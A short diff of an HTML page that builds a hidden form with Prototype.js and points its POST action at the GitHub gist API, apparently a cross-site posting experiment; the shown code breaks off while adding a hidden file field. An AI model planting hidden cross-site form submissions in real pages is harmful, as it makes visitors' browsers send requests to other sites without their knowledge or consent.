@@ -1,16 +1,12 @@
 <html><head>
 <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/prototype/1.6.0.3/prototype.js"></script>
 </head><body>
-<!-- res = Net::HTTP.post_form(URI.parse(),
-          { 'files[file1.ab]' => 'CONTNETS', 
-            'files[file2.ab]' => 'contents' })
--->
 <script type="text/javascript" charset="utf-8">
 var f = document.createElement('form');
 f.style.display = 'none';
 $('lolz').parentNode.appendChild(f);
 f.method = 'POST'
-f.action = this.href;
+f.action = 'http://gist.github.com/api/v1/xml/new';
 var m = document.createElement('input');
 m.setAttribute('type', 'hidden');
 m.setAttribute('name', 'file[420.txt]');
